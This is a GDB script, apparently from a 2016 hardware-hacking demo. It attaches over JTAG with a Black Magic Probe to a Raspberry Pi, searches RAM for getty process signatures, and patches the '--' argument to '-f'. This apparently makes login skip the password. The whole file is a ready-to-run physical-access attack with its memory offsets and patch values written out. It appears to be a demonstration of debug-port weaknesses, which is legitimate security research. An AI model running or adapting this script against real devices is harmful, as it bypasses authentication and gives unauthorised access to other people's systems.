#!arm-none-eabi-gdb -x
# GDB & Black Magic Probe Jtagsploitation demo
# Copyright (C) 2016 Piotr Esden-Tempski <piotr@esden.net>
#
# This Jtagsploitation demo is free software: you can redistribute it and/or
# modify it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or (at your
# option) any later version.
#
# Foobar is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with
# Foobar. If not, see <http://www.gnu.org/licenses/>.


###############################################################################
# This user defined GDB command searches memory every 4kb (Linux page size) for
# a signature that is expected at $offset from the beginning of the page. Then
# it checks if the second signature also matches and if so it patches the
# memory to contain "-f" instead of "--"
#
# You can call the find_and_patch command with the starting address. The
# default is 0x80000000 that is the beginning of RPi ram and runs through the
# whole 4GB of memory.
define find_and_patch
if ($argc == 1)
	set $start = $arg0
else
	set $start = 0x80000000
end
set $step = 0x1000
set $range = 0x40000000
set $maxaddr = 0xbb000000
set $offset = 0xb44
set $sig1 = 0x00002d2d
set $sig2 = 0x203a7325
set $addr = $start
if (($start+$range) > $maxaddr)
	set $end = $maxaddr
else
	set $end = $start+$range
end
while($addr < $end)
	if (*($addr+$offset) == $sig1)
		printf "\nFound signature 1 at address 0x%08x\n", $addr
		x/4x $addr+$offset
		if (*($addr+$offset+4) == $sig2)
			printf "Signature 2 is matching too. Patching...\n"
			set *($addr+$offset)=0x0000662d
			x/4x $addr+$offset
		else
			printf "Signature 2 does not match.\n"
		end
	end
	if (($addr % 0x10000) == 0)
		printf "."
	end
	if (($addr % 0x400000) == 0)
		printf "\n0x%08x", $addr
	end
	set $addr=$addr+$step
end
printf "\nDone.\n"
end

###############################################################################
# Connect to the Black Magic Probe
target extended-remote /dev/ttyACM0

# Print firmware version of BMP
monitor version

# Scan the jtag chain
monitor jtag_scan

# Attach to the 1st CPU core
attach 1

# Run the find and patch routine.
# We let it start at 0xb0000000 to save time, the getty precesses usually are
# somewhere at the end of the RAM address space.
find_and_patch 0xb0000000

# Detach from the CPU core
detach

# Exit the script
quit
